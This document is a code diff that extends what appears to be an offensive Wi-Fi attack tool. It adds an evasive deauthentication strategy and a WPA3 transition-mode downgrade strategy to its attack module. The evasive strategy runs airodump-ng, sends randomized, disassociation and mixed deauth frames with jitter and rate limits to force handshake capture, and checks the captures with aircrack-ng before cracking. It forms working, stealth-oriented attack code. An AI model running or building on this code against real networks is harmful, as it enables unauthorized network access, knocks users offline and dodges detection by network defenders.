@@ -24,6 +24,8 @@ class AttackStrategy(Enum):
     PMKID = "pmkid"
     PASSIVE = "passive"
     DEAUTH = "deauth"
+    DEAUTH_EVASION = "deauth_evasion"
+    WPA3_DOWNGRADE = "wpa3_downgrade"
 
 
 @dataclass
@@ -51,8 +53,21 @@ class AttackModule:
     def select_strategy(
         self,
         pmf_info: dict | None = None,
+        wpa3_info: dict | None = None,
+        evasion: bool = False,
     ) -> list[AttackStrategy]:
         strategies = []
+
+        if wpa3_info and wpa3_info.get("transition_mode"):
+            strategies.append(AttackStrategy.WPA3_DOWNGRADE)
+            console.print("[yellow]WPA3 transition mode — downgrade attack queued[/yellow]")
+
+        if wpa3_info and wpa3_info.get("sae_only"):
+            console.print(
+                "[red]SAE-only AP — standard WPA2 capture/crack will not work. "
+                "Use wpa3 timing/group commands instead.[/red]"
+            )
+            return strategies if strategies else [AttackStrategy.PMKID]
 
         strategies.append(AttackStrategy.PMKID)
         strategies.append(AttackStrategy.PASSIVE)
@@ -68,9 +83,14 @@ class AttackModule:
                 console.print(
                     "[yellow]PMF capable on target — deauth may fail for PMF-enabled clients[/yellow]"
                 )
+                if evasion:
+                    strategies.append(AttackStrategy.DEAUTH_EVASION)
                 strategies.append(AttackStrategy.DEAUTH)
             else:
-                strategies.append(AttackStrategy.DEAUTH)
+                if evasion:
+                    strategies.append(AttackStrategy.DEAUTH_EVASION)
+                else:
+                    strategies.append(AttackStrategy.DEAUTH)
 
         console.print(
             f"[dim]Strategy order: "
@@ -83,11 +103,15 @@ class AttackModule:
         client_mac: str | None = None,
         output_dir: str = "./captures",
         pmf_info: dict | None = None,
+        wpa3_info: dict | None = None,
+        evasion: bool = False,
     ) -> CaptureResult:
         os.makedirs(output_dir, exist_ok=True)
         self.opsec.pre_operation()
 
-        strategies = self.select_strategy(pmf_info=pmf_info)
+        strategies = self.select_strategy(
+            pmf_info=pmf_info, wpa3_info=wpa3_info, evasion=evasion,
+        )
         for strategy in strategies:
             console.print(f"[cyan]Trying {strategy.value}...[/cyan]")
 
@@ -97,6 +121,14 @@ class AttackModule:
                 result = self._capture_passive(interface, bssid, channel, output_dir)
             elif strategy == AttackStrategy.DEAUTH:
                 result = self._capture_deauth(
+                    interface, bssid, channel, client_mac, output_dir,
+                )
+            elif strategy == AttackStrategy.DEAUTH_EVASION:
+                result = self._capture_deauth_evasion(
+                    interface, bssid, channel, client_mac, output_dir,
+                )
+            elif strategy == AttackStrategy.WPA3_DOWNGRADE:
+                result = self._capture_wpa3_downgrade(
                     interface, bssid, channel, client_mac, output_dir,
                 )
             else:
@@ -323,6 +355,92 @@ class AttackModule:
         return CaptureResult(
             success=False, strategy=AttackStrategy.DEAUTH,
             message="Deauth sent but no handshake captured",
+        )
+
+    def _capture_deauth_evasion(
+        self, interface: str, bssid: str, channel: int,
+        client_mac: str | None, output_dir: str,
+    ) -> CaptureResult:
+        from .packets import deauth_evasion
+
+        prefix = os.path.join(output_dir, f"evasion_{bssid.replace(':', '')}")
+
+        dump_proc = subprocess.Popen(
+            ["sudo", "airodump-ng",
+             "-c", str(channel),
+             "--bssid", bssid,
+             "-w", prefix,
+             interface],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+
+        time.sleep(3)
+
+        target = client_mac or "ff:ff:ff:ff:ff:ff"
+        for method in ("randomized", "disassoc", "mixed"):
+            deauth_evasion(
+                interface, target, bssid,
+                count=self.config.stealth.deauth_max_packets,
+                method=method,
+                rate_limit=5.0,
+            )
+            self.opsec.jitter(3.0)
+
+            cap_file = f"{prefix}-01.cap"
+            if os.path.exists(cap_file):
+                check = subprocess.run(
+                    ["aircrack-ng", cap_file],
+                    capture_output=True, text=True,
+                )
+                if "1 handshake" in check.stdout:
+                    dump_proc.send_signal(signal.SIGINT)
+                    try:
+                        dump_proc.wait(timeout=5)
+                    except subprocess.TimeoutExpired:
+                        dump_proc.kill()
+                        dump_proc.wait()
+                    return CaptureResult(
+                        success=True, strategy=AttackStrategy.DEAUTH_EVASION,
+                        capture_file=cap_file,
+                    )
+
+        dump_proc.send_signal(signal.SIGINT)
+        try:
+            dump_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            dump_proc.kill()
+            dump_proc.wait()
+
+        return CaptureResult(
+            success=False, strategy=AttackStrategy.DEAUTH_EVASION,
+            message="Evasive deauth sent but no handshake captured",
+        )
+
+    def _capture_wpa3_downgrade(
+        self, interface: str, bssid: str, channel: int,
+        client_mac: str | None, output_dir: str,
+    ) -> CaptureResult:
+        from .wpa3 import Wpa3Module
+
+        wpa3 = Wpa3Module(self.config, self.opsec)
+        result = wpa3.transition_downgrade(
+            interface, bssid, channel,
+            client_mac=client_mac,
+            output_dir=output_dir,
+        )
+
+        if result.success and result.capture_file:
+            return CaptureResult(
+                success=True,
+                strategy=AttackStrategy.WPA3_DOWNGRADE,
+                capture_file=result.capture_file,
+            )
+
+        return CaptureResult(
+            success=False,
+            strategy=AttackStrategy.WPA3_DOWNGRADE,
+            message=result.message,
         )
 
     def crack(self, capture: CaptureResult) -> CrackResult:
